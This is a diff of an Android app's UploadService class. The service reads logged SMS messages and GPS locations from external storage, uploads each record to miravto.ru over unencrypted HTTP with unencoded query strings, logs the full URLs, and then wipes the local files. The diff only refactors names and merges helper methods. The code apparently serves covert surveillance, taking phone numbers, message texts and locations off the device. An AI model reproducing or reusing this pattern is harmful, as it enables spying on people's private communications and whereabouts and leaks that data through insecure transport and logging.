@@ -12,7 +12,6 @@ import java.io.FileReader;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
 import java.util.ArrayList;
 
 /**
@@ -22,6 +21,8 @@ import java.util.ArrayList;
 public class UploadService extends IntentService{
 
     private static final String TAG = "UploadService";
+    public static final String LOCATION_STORAGE = "loc.log";
+    public static final String MESSAGE_STORAGE = "mes.log";
 
     public UploadService(){
         super("UploadService");
@@ -31,11 +32,12 @@ public class UploadService extends IntentService{
     protected void onHandleIntent(@Nullable Intent intent) {
         boolean uploadSuccess = true;
         Log.d(TAG, "Alarm intent running");
-        LocationData[] data = readStorage();
+        LocationData[] data = readLocationStorage();
         if (data != null && data.length>0) {
             uploadSuccess = uploadData(data);
             if (uploadSuccess) {
-                deleteStorage();
+                deleteStorage(LOCATION_STORAGE);
+                Log.v(TAG, "No locations found");
             }
         }
 
@@ -45,26 +47,11 @@ public class UploadService extends IntentService{
                 Log.v(TAG, "Messages found: "+smsData.length);
                 if (uploadSMS(smsData))
                 {
-                    deleteSMSStorage();
+                    deleteStorage(MESSAGE_STORAGE);
                 }
             }
-        }
-    }
-
-    private void deleteSMSStorage() {
-        Log.v(TAG, "Start emptying storage");
-        File path = Environment.getExternalStorageDirectory();
-        File file = new File(path, "mes.log");
-
-        if (file.exists()) {
-            Log.v(TAG, "Deleting file");
-            file.delete();
-            try {
-                Log.v(TAG, "Recreating file");
-                file.createNewFile();
-            }
-            catch (IOException e){
-                Log.e(TAG, e.getMessage());
+            else {
+                Log.v(TAG, "No messages found");
             }
         }
     }
@@ -72,12 +59,12 @@ public class UploadService extends IntentService{
     private boolean uploadSMS(SMSData[] smslist) {
         boolean success = false;
 
-        Log.v(TAG, "Start data upload");
+        Log.v(TAG, "Start SMS data upload");
 
         for (SMSData sms : smslist) {
             HttpURLConnection urlConnection = null;
             try {
-                String strUrl = "http://www.miravto.ru/sms.php?t=" + sms.Datetime + "&p=" + sms.PhoneNumber + "&m=" +  sms.Message;
+                String strUrl = "http://www.miravto.ru/sms.php?t=" + sms.getDatetime() + "&p=" + sms.getPhoneNumber() + "&m=" +  sms.getMessage();
                 Log.i(TAG, strUrl);
                 URL url = new URL(strUrl);
                 urlConnection = (HttpURLConnection) url.openConnection();
@@ -94,11 +81,11 @@ public class UploadService extends IntentService{
     }
 
     private SMSData[] readSMSStorage() {
-        Log.v(TAG, "Start reading storage");
+        Log.v(TAG, "Start reading SMS storage");
         ArrayList<SMSData> smslist = new ArrayList<SMSData>();
 
         File path = Environment.getExternalStorageDirectory();
-        File file = new File(path, "mes.log");
+        File file = new File(path, MESSAGE_STORAGE);
 //        Log.v(TAG, file.getAbsolutePath());
 
         if (!file.exists())
@@ -125,16 +112,16 @@ public class UploadService extends IntentService{
         }
     }
 
-    private void deleteStorage() {
-        Log.v(TAG, "Start emptying storage");
+    private void deleteStorage(String storage) {
+        Log.v(TAG, "Start emptying storage " + storage);
         File path = Environment.getExternalStorageDirectory();
-        File file = new File(path, "loc.log");
+        File file = new File(path, storage);
 
         if (file.exists()) {
-            Log.v(TAG, "Deleting file");
+            Log.v(TAG, "Deleting file " + storage);
             file.delete();
             try {
-                Log.v(TAG, "Recreating file");
+                Log.v(TAG, "Recreating file " + storage);
                 file.createNewFile();
             }
             catch (IOException e){
@@ -146,12 +133,12 @@ public class UploadService extends IntentService{
     private boolean uploadData(LocationData[] locations) {
         boolean success = false;
 
-        Log.v(TAG, "Start data upload");
+        Log.v(TAG, "Start location data upload");
 
         for (LocationData loc : locations) {
             HttpURLConnection urlConnection = null;
             try {
-                String strUrl = "http://www.miravto.ru/agps.php?lat=" + loc.Latitude + "&lon=" + loc.Longtitude + "&t=" + loc.Datetime;
+                String strUrl = "http://www.miravto.ru/agps.php?lat=" + loc.getLatitude() + "&lon=" + loc.getLongitude() + "&t=" + loc.getDatetime();
                 Log.i(TAG, strUrl);
                 URL url = new URL(strUrl);
                 urlConnection = (HttpURLConnection) url.openConnection();
@@ -167,12 +154,12 @@ public class UploadService extends IntentService{
         return true;
     }
 
-    private LocationData[] readStorage() {
-        Log.v(TAG, "Start reading storage");
+    private LocationData[] readLocationStorage() {
+        Log.v(TAG, "Start reading location storage");
         ArrayList<LocationData> locations = new ArrayList<LocationData>();
 
         File path = Environment.getExternalStorageDirectory();
-        File file = new File(path, "loc.log");
+        File file = new File(path, LOCATION_STORAGE);
 //        Log.v(TAG, file.getAbsolutePath());
 
         if (!file.exists())
